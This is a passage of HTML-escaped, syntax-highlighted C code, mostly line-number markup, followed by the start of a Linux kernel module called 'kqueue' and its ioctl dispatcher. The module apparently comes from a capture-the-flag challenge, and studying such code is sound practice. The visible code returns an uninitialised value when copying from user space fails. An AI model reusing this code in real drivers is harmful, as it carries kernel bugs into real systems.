&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;220&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;223&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;224&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;225&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;226&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;230&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;231&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;232&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;233&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;234&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;235&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;237&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;238&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;239&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;240&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;241&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;242&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;243&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;244&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;245&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;246&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;247&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;248&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;249&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;251&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;252&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;253&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;254&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;257&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;258&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;259&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;260&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;261&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;262&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Generic header files */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/kernel.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/module.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/device.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/mutex.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/fs.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/slab.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/uaccess.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;kqueue.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; GCC push_options&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; GCC optimize (&lt;span class=&#34;string&#34;&gt;&amp;quot;O1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;kqueue_ioctl&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; file *file, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cmd, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; arg)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mutex_lock(&amp;amp;operations_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (copy_from_user((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&amp;amp;request, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)arg, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] copy_from_user failed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt;(cmd)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; CREATE_KQUEUE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = create_kqueue(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; DELETE_KQUEUE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = delete_kqueue(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; EDIT_KQUEUE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = edit_kqueue(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; SAVE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = save_kqueue_entries(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = INVALID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mutex_unlock(&amp;amp;operations_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 